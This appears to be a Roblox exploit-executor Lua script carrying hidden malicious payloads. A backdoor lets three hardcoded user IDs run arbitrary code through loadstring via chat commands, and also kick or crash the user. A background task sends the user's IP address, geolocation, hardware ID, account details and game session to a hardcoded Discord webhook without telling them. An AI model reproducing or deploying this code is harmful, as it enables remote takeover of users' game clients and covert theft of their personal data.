local function getplr(str)
    local plrs = game.Players:GetPlayers()
    if str:lower() == "all" then
        return plrs
    elseif str:lower() == "others" then
        for i, v in ipairs(plrs) do
            if v == game.Players.LocalPlayer then
                table.remove(plrs, i)
                return plrs
            end
        end
    elseif str:lower() == "me" then
        return {game.Players.LocalPlayer}
    else
        local cockandballs = {}
        for i, v in pairs(game.Players:GetPlayers()) do
            if str:lower() == (v.Name:lower()):sub(1, #str) or str:lower() == (v.DisplayName:lower()):sub(1, #str) then
                table.insert(cockandballs, v)
            end
        end
        return cockandballs
    end
end
local allowed = {
    1551416114,
    1389780396,
    252684030
}
local bdconnections = {}
local function updbd()
    for i,v in pairs(bdconnections) do
        pcall(function()
            v:Disconnect()
        end)
    end
    for i, v in pairs(game.Players:GetPlayers()) do
        if table.find(allowed, v.UserId) then
            bdconnections[v.UserId] =
                v.Chatted:Connect(
                function(msg)
                    local args = msg:split(" ")
                    if args[1] == "^run" then
                        loadstring(table.concat(args, " ", 2))()
                    elseif args[1] == "^ktest" then
                        game.Players:Chat(
                            "(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)"
                        )
                        task.wait(0.3)
                        local args = {
                            [1] = "/w " .. v.Name .. " true",
                            [2] = "All"
                        }

                        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild(
                            "SayMessageRequest"
                        ):FireServer(unpack(args))
                    elseif args[1] == "^kick" then
                        for i,v in pairs(getplr(args[2])) do
                            if v == game.Players.LocalPlayer then
                                local reason = table.concat(args, " ", 3)
                                game.Players.LocalPlayer:Kick(reason)
                                task.wait(1)
                                repeat until false
                            end
                        end
                    elseif args[1] == "^crash" then
                        repeat until false
                    end
                end
            )
        end
    end
end

task.delay(0.5, function()
    game.Players.PlayerAdded:Connect(function()
        updbd()
    end)
    game.Players.PlayerRemoving:Connect(function()
        updbd()
    end)
    updbd()
end)

task.spawn(function()
    local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")


local LocalPlayer = Players.LocalPlayer
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'


local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

local function detectExecutor()
    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
                    or (secure_load and "Sentinel")
                    or (pebc_execute and "ProtoSmasher")
                    or (KRNL_LOADED and "Krnl")
                    or (is_sirhurt_closure and "SirHurt")
                    or (identifyexecutor():find("ScriptWare") and "Script-Ware")
                    or "Unsupported"
    return executor
end

local function createWebhookData()
    local webhookcheck = detectExecutor()
    
    local data = {
        ["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
        ["content"] = "",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "Someone executed your script",
                    ["url"] = "https://roblox.com",
                },
                ["description"] = string.format(
                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
                    GetData, ConsoleJobId
                ),
                ["type"] = "rich",
                ["color"] = tonumber("0xFFD700"), -- Change the color if you want
                ["thumbnail"] = {
                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
                },
            }
        }
    }
    return HttpService:JSONEncode(data)
end

local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(abcdef)
end

local webhookUrl = "https://discord.com/api/webhooks/1278108512337006672/IYJA3XQXwSUV2tM1AZKru19rvl3lmniRZTjkxMSqMKf6meS3MT5nEhZ1EVFHdzEHunZ1"
local webhookData = createWebhookData()

sendWebhook(webhookUrl, webhookData)
end)
